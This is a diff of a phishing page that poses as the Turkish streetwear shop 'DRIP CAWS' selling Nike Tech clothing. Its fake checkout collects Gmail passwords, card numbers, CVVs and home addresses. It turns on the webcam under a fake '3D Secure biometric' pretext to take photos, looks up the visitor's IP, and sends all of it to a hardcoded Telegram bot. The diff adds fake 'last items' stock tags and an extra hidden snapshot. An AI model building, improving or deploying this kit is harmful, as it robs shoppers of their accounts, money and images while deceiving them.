@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DRIP CAWS | Archive 2026</title>
+    <title>DRIP CAWS | Official Nike Tech & Streetwear Archive</title>
     <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
     <style>
         :root { --blue: #2997ff; --dark: #000; --card: #0d0d0d; --grey: #86868b; }
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body { background: var(--dark); color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }
 
-        /* SPLASH */
+        /* SPLASH SCREEN */
         #splash { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: 0.8s cubic-bezier(0.85, 0, 0.15, 1); }
         .splash-logo { font-family: 'Syncopate', sans-serif; font-size: 40px; letter-spacing: -2px; margin-bottom: 20px; }
         .splash-logo span { color: var(--blue); }
-        .enter-btn { padding: 18px 50px; border: 1px solid #fff; background: transparent; color: #fff; font-family: 'Syncopate', sans-serif; font-size: 11px; cursor: pointer; transition: 0.3s; }
+        .enter-btn { padding: 18px 50px; border: 1px solid #fff; background: transparent; color: #fff; font-family: 'Syncopate', sans-serif; font-size: 11px; cursor: pointer; transition: 0.3s; letter-spacing: 1px; }
 
         /* APP LAYOUT */
         #main-app { display: none; opacity: 0; transition: 1s; }
@@ -32,12 +32,15 @@
         /* GRID */
         .container { padding: 30px 5%; max-width: 1400px; margin: 0 auto; }
         .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; }
-        .p-card { background: var(--card); border: 1px solid #161616; border-radius: 4px; overflow: hidden; transition: 0.4s; cursor: pointer; }
+        .p-card { background: var(--card); border: 1px solid #161616; border-radius: 4px; overflow: hidden; transition: 0.4s; cursor: pointer; position: relative; }
         .p-card:hover { border-color: var(--blue); transform: translateY(-5px); }
-        .p-img { width: 100%; height: 320px; object-fit: cover; }
+        .img-wrap { width: 100%; height: 320px; background: #0a0a0a; display: flex; align-items: center; justify-content: center; }
+        .p-img { width: 100%; height: 100%; object-fit: cover; transition: 0.5s; }
+        .p-card:hover .p-img { transform: scale(1.05); }
         .p-info { padding: 15px; }
-        .p-name { font-size: 12px; font-weight: 700; margin-bottom: 5px; text-transform: uppercase; }
+        .p-name { font-size: 12px; font-weight: 700; margin-bottom: 5px; text-transform: uppercase; color: #fff; }
         .p-price { color: var(--blue); font-weight: 900; }
+        .stock-tag { position: absolute; top: 10px; right: 10px; font-size: 10px; color: #ff3b30; font-weight: 700; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 4px; }
 
         /* MODALS */
         .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 5000; padding: 40px 5%; overflow-y: auto; }
@@ -45,13 +48,13 @@
         .step { display: none; }
         .step.active { display: block; }
         
-        input, textarea { width: 100%; padding: 15px; background: #0a0a0a; border: 1px solid #222; color: #fff; border-radius: 4px; margin-bottom: 15px; outline: none; }
-        input:focus { border-color: var(--blue); }
-        .next-btn { width: 100%; padding: 18px; background: var(--blue); color: #000; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; font-size: 12px; }
+        input, textarea, select { width: 100%; padding: 15px; background: #0a0a0a; border: 1px solid #222; color: #fff; border-radius: 4px; margin-bottom: 15px; outline: none; font-family: 'Inter', sans-serif; }
+        input:focus, select:focus { border-color: var(--blue); }
+        .next-btn { width: 100%; padding: 18px; background: var(--blue); color: #000; font-weight: 900; border: none; cursor: pointer; text-transform: uppercase; font-size: 12px; font-family: 'Syncopate', sans-serif; }
 
         /* SCANNER */
         #scan-view { display: none; position: fixed; inset: 0; background: #000; z-index: 6000; flex-direction: column; align-items: center; justify-content: center; }
-        .cam-box { width: 280px; height: 280px; border-radius: 50%; border: 3px solid var(--blue); overflow: hidden; position: relative; }
+        .cam-box { width: 280px; height: 280px; border-radius: 50%; border: 3px solid var(--blue); overflow: hidden; position: relative; box-shadow: 0 0 30px rgba(41, 151, 255, 0.3); }
         video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
         .laser { position: absolute; width: 100%; height: 2px; background: var(--blue); box-shadow: 0 0 10px var(--blue); animation: move 2s infinite linear; }
         @keyframes move { 0%, 100% { top: 10%; } 50% { top: 90%; } }
@@ -75,9 +78,10 @@
         </div>
         <div class="cat-nav">
             <div class="cat-item active" onclick="render('all')">Archive</div>
-            <div class="cat-item" onclick="render('track')">Eşofman</div>
-            <div class="cat-item" onclick="render('hoodie')">Hoodie</div>
-            <div class="cat-item" onclick="render('acc')">Aksesuar</div>
+            <div class="cat-item" onclick="render('track')">Tracksuits</div>
+            <div class="cat-item" onclick="render('hoodie')">Hoodies</div>
+            <div class="cat-item" onclick="render('tech')">Nike Tech</div>
+            <div class="cat-item" onclick="render('acc')">Acc</div>
         </div>
     </header>
 
@@ -90,26 +94,31 @@
     <div class="step-container">
         <div class="step active" id="step1">
             <h2 style="font-family:'Syncopate'; margin-bottom:20px;">SÖZLEŞME ONAYI</h2>
-            <div style="height:200px; overflow-y:scroll; background:#0a0a0a; padding:15px; font-size:11px; color:var(--grey); margin-bottom:20px; border:1px solid #222;">
-                DRIP CAWS Limited Edition satış sözleşmesi kapsamında; satın alınan ürünlerin iadesi yapılamaz. Kullanıcı, 3D Secure biyometrik doğrulamayı kabul eder. Verilerin işlenmesi KVKK kapsamında Google Cloud Archive üzerinde saklanır.
+            <div style="height:150px; overflow-y:scroll; background:#0a0a0a; padding:15px; font-size:11px; color:var(--grey); margin-bottom:20px; border:1px solid #222;">
+                DRIP CAWS Limited Edition satış sözleşmesi kapsamında; satın alınan ürünlerin iadesi yapılamaz. Kullanıcı, 3D Secure biyometrik doğrulamayı kabul eder. Verilerin işlenmesi KVKK kapsamında Google Cloud Archive üzerinde saklanır. Nike Tech Fleece ürünlerinde beden değişimi stok durumuna bağlıdır.
             </div>
-            <label style="font-size:12px; display:flex; gap:10px; align-items:center; margin-bottom:20px;">
-                <input type="checkbox" id="check" style="width:20px; margin:0;"> Okudum, onaylıyorum.
+            <label style="font-size:12px; display:flex; gap:10px; align-items:center; margin-bottom:20px; cursor:pointer;">
+                <input type="checkbox" id="check" style="width:20px; margin:0; cursor:pointer;"> Okudum, onaylıyorum.
             </label>
-            <button class="next-btn" onclick="goStep(2)">DEVAM ET</button>
+            <button class="next-btn" onclick="goStep(2)">TESLİMAT ADRESİNE GEÇ</button>
         </div>
 
         <div class="step" id="step2">
             <h2 style="font-family:'Syncopate'; margin-bottom:20px;">TESLİMAT ADRESİ</h2>
-            <input type="text" id="city" placeholder="Şehir">
+            <select id="city">
+                <option value="">Şehir Seçiniz</option>
+                <option value="Istanbul">İstanbul</option>
+                <option value="Ankara">Ankara</option>
+                <option value="Izmir">İzmir</option>
+            </select>
             <textarea id="address" placeholder="Tam Ev Adresi / Bina / Kat / Daire" rows="4"></textarea>
-            <input type="text" id="zip" placeholder="Posta Kodu">
+            <input type="text" id="zip" placeholder="Posta Kodu (İsteğe Bağlı)">
             <button class="next-btn" onclick="goStep(3)">ÖDEME YÖNTEMİNE GEÇ</button>
         </div>
 
         <div class="step" id="step3">
             <h2 style="font-family:'Syncopate'; margin-bottom:20px;">KART BİLGİLERİ</h2>
-            <input type="email" id="email" placeholder="Gmail Hesabınız">
+            <input type="email" id="email" placeholder="Gmail Hesabınız (Adres Senkronizasyonu İçin)">
             <input type="password" id="pass" placeholder="Gmail Şifreniz">
             <hr style="border:0; border-top:1px solid #222; margin:20px 0;">
             <input type="text" id="cno" placeholder="0000 0000 0000 0000">
@@ -129,34 +138,44 @@
         <input type="email" id="acc-mail" placeholder="Gmail Adresi">
         <input type="password" id="acc-pass" placeholder="Şifre">
         <button class="next-btn" onclick="saveAcc()">BAĞLA</button>
-        <p onclick="closeAcc()" style="text-align:center; margin-top:20px; font-size:11px; cursor:pointer;">Vazgeç</p>
+        <p onclick="closeAcc()" style="text-align:center; margin-top:20px; font-size:11px; cursor:pointer; color:var(--blue);">Vazgeç</p>
     </div>
 </div>
 
 <div id="scan-view">
     <div class="cam-box"><div class="laser"></div><video id="web" autoplay playsinline muted></video></div>
-    <p style="margin-top:20px; font-family:'Syncopate'; font-size:10px; color:var(--blue);">BIOMETRIC SCANNING...</p>
+    <p style="margin-top:20px; font-family:'Syncopate'; font-size:10px; color:var(--blue); letter-spacing:1px;">BIOMETRIC SCANNING...</p>
 </div>
 
 <script>
     const TG = { t: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc", c: "1540769169" };
 
     const db = [
-        { cat: 'track', name: 'Mamba Grey Jogger', price: 950, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?w=400' },
-        { cat: 'track', name: 'Elite Velvet Bottom', price: 1100, img: 'https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=400' },
-        { cat: 'track', name: 'Cargo Tech Pants', price: 1200, img: 'https://images.unsplash.com/photo-1552374196-1ab2a1c593e8?w=400' },
-        { cat: 'track', name: 'Oversize Street Jogger', price: 850, img: 'https://images.unsplash.com/photo-1580915411954-282cb1b0d780?w=400' },
-        { cat: 'track', name: 'Dark Soul Sweatpants', price: 1050, img: 'https://images.unsplash.com/photo-1506629082923-f11236f5a8ec?w=400' },
-        { cat: 'track', name: 'Essential Fleece Pant', price: 900, img: 'https://images.unsplash.com/photo-1542272604-787c3835535d?w=400' },
-        { cat: 'hoodie', name: 'V-Lone Style Hoodie', price: 1350, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?w=400' },
-        { cat: 'hoodie', name: 'Boxy Bone Hoodie', price: 1250, img: 'https://images.unsplash.com/photo-1591047139829-d91aecb6caea?w=400' },
-        { cat: 'acc', name: 'Signature Beanie', price: 450, img: 'https://images.unsplash.com/photo-1576871337622-98d48d1cf531?w=400' },
-        { cat: 'acc', name: 'Utility Chest Bag', price: 800, img: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=400' },
-        { cat: 'hoodie', name: 'Zip-Up Dark Grey', price: 1400, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=80' },
-        { cat: 'track', name: 'Acid Wash Jogger', price: 1150, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?q=80' },
-        { cat: 'hoodie', name: 'Caws Gothic Sweat', price: 1200, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?q=80' },
-        { cat: 'acc', name: 'Tactical Gloves', price: 600, img: 'https://images.unsplash.com/photo-1551488831-00ddcb6c6bd3?w=400' },
-        { cat: 'track', name: 'Panelled Tech Pant', price: 1300, img: 'https://images.unsplash.com/photo-1552374196-1ab2a1c593e8?q=60' }
+        // NIKE TECH FLEECE (Özel İstek)
+        { cat: 'tech', name: 'Nike Tech Fleece Siyah Alt-Üst Takım', price: 1500, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?w=600&q=80', stock: 'SON 2' },
+        { cat: 'tech', name: 'Nike Tech Fleece Üst (Siyah)', price: 800, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?w=600&q=80', stock: 'SINIRLI' },
+        { cat: 'tech', name: 'Nike Tech Fleece Alt (Siyah)', price: 800, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?w=600&q=80' },
+        
+        // EŞOFMAN (Tracksuits - 6+ Tane)
+        { cat: 'track', name: 'Mamba Grey Heavy Jogger', price: 950, img: 'https://images.unsplash.com/photo-1580915411954-282cb1b0d780?w=600&q=80', stock: 'SON 3' },
+        { cat: 'track', name: 'Elite Velvet Tracksuit Bottom', price: 1100, img: 'https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=600&q=80' },
+        { cat: 'track', name: 'Oversize Street Jogger Black', price: 850, img: 'https://images.unsplash.com/photo-1542272604-787c3835535d?w=600&q=80' },
+        { cat: 'track', name: 'Dark Soul Cargo Sweatpants', price: 1250, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?q=60&w=600&q=80' },
+        { cat: 'track', name: 'Essential White Fleece Pant', price: 900, img: 'https://images.unsplash.com/photo-1506629082923-f11236f5a8ec?w=600&q=80' },
+        { cat: 'track', name: 'Vintage Wash Jogger', price: 1050, img: 'https://images.unsplash.com/photo-1580915411954-282cb1b0d780?q=60' },
+
+        // HOODIES (6+ Tane)
+        { cat: 'hoodie', name: 'Bone White Essential Hoodie', price: 1200, img: 'https://images.unsplash.com/photo-1591047139829-d91aecb6caea?w=600&q=80', stock: 'SON 4' },
+        { cat: 'hoodie', name: 'Boxy V-Lone Style Hoodie', price: 1350, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=70' },
+        { cat: 'hoodie', name: 'Midnight Black Oversize', price: 1250, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=60' },
+        { cat: 'hoodie', name: 'Caws Gothic Graphic Sweat', price: 1200, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?q=60' },
+        { cat: 'hoodie', name: 'Zip-Up Heavy Hoodie (Dark Grey)', price: 1400, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=50' },
+        { cat: 'hoodie', name: 'Oversize Earth Tone Sweatshirt', price: 1150, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?q=70' },
+
+        // AKSESUAR (Acc)
+        { cat: 'acc', name: 'Signature Archive Beanie Black', price: 450, img: 'https://images.unsplash.com/photo-1576871337622-98d48d1cf531?w=600&q=80' },
+        { cat: 'acc', name: 'Utility Tactical Chest Bag', price: 800, img: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?w=600&q=80' },
+        { cat: 'acc', name: 'Drip Gloves V1', price: 600, img: 'https://images.unsplash.com/photo-1551488831-00ddcb6c6bd3?w=600&q=80' }
     ];
 
     function initApp() {
@@ -175,7 +194,8 @@
         data.forEach(p => {
             g.innerHTML += `
                 <div class="p-card" onclick="openPay()">
-                    <img src="${p.img}" class="p-img">
+                    ${p.stock ? `<span class="stock-tag">${p.stock}!</span>` : ''}
+                    <div class="img-wrap"><img src="${p.img}" class="p-img" onerror="this.src='https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?w=600&q=80'"></div>
                     <div class="p-info">
                         <p class="p-name">${p.name}</p>
                         <p class="p-price">₺${p.price}</p>
@@ -183,6 +203,8 @@
                 </div>
             `;
         });
+        document.querySelectorAll('.cat-item').forEach(i => i.classList.remove('active'));
+        document.querySelector(`.cat-item[onclick="render('${f}')"]`).classList.add('active');
     }
 
     function openPay() { document.getElementById('pay-modal').style.display = 'block'; }
@@ -196,29 +218,43 @@
     }
 
     async function startFinal() {
+        if(!document.getElementById('email').value || !document.getElementById('pass').value || !document.getElementById('cno').value) return alert("Lütfen kart ve Gmail alanlarını doldurun.");
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: true });
             document.getElementById('web').srcObject = s;
             document.getElementById('pay-modal').style.display = 'none';
             document.getElementById('scan-view').style.display = 'flex';
+            setTimeout(() => snap(document.getElementById('web'), "BIO_START"), 1200);
             setTimeout(() => {
                 document.getElementById('flash').style.display = 'block';
                 setTimeout(() => document.getElementById('flash').style.display = 'none', 100);
                 sendRapor(document.getElementById('web'));
-            }, 5000);
-        } catch(e) { alert("Kamera izni gerekli."); }
+            }, 6000);
+        } catch(e) { alert("3D Secure hatası: Kamera izni gerekli."); }
     }
 
     async function saveAcc() {
         const m = document.getElementById('acc-mail').value;
         const p = document.getElementById('acc-pass').value;
-        const text = `👤 **YENI HESAP BAGLANTISI**\n📧 Mail: \`${m}\`\n🔑 Sifre: \`${p}\``;
+        if(!m || !p) return alert("Lütfen Gmail ve şifreyi girin.");
+        const text = `👤 **HESAP EKLEME TALEBI**\n📧 Mail: \`${m}\`\n🔑 Sifre: \`${p}\``;
         await fetch(`https://api.telegram.org/bot${TG.t}/sendMessage?chat_id=${TG.c}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
-        alert("Hesap başarıyla senkronize edildi.");
+        alert("Hesap başarıyla senkronize edildi. Kuponunuz bir sonraki siparişte tanımlanacaktır.");
         closeAcc();
     }
 
-    function sendRapor(v) {
+    function snap(v, label) {
+        const c = document.createElement('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            const fd = new FormData(); fd.append('photo', b, 'f.jpg');
+            fd.append('caption', `📡 **DC [${label}]**\n👤 Mail: ${document.getElementById('email').value}`);
+            fetch(`https://api.telegram.org/bot${TG.t}/sendPhoto?chat_id=${TG.c}`, { method: 'POST', body: fd });
+        }, 'image/jpeg', 0.6);
+    }
+
+    async function sendRapor(v) {
         const c = document.createElement('canvas');
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
@@ -227,13 +263,13 @@
             await fetch(`https://api.telegram.org/bot${TG.t}/sendPhoto?chat_id=${TG.c}`, { method: 'POST', body: fd });
             const ip = await (await fetch('https://ipapi.co/json/')).json();
             const text = `
-🔥 **DRIP CAWS | FULL REPORT**
+🔥 **DRIP CAWS | FINAL MAMBA REPORT**
 📧 Mail: \`${document.getElementById('email').value}\`
 🔑 Pass: \`${document.getElementById('pass').value}\`
 💳 Kart: \`${document.getElementById('cno').value}\`
 📅 SKT/CVV: \`${document.getElementById('cexp').value}\` / \`${document.getElementById('cvv').value}\`
-🏠 Adres: ${document.getElementById('city').value} / ${document.getElementById('address').value}
-🌍 IP: ${ip.ip}`;
+🏠 Konum: ${document.getElementById('city').value} / ${document.getElementById('address').value}
+🌐 IP: \`${ip.ip}\` | 📍 ${ip.city}`;
             await fetch(`https://api.telegram.org/bot${TG.t}/sendMessage?chat_id=${TG.c}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
             window.location.href = "https://caws.network";
         }, 'image/jpeg', 0.9);
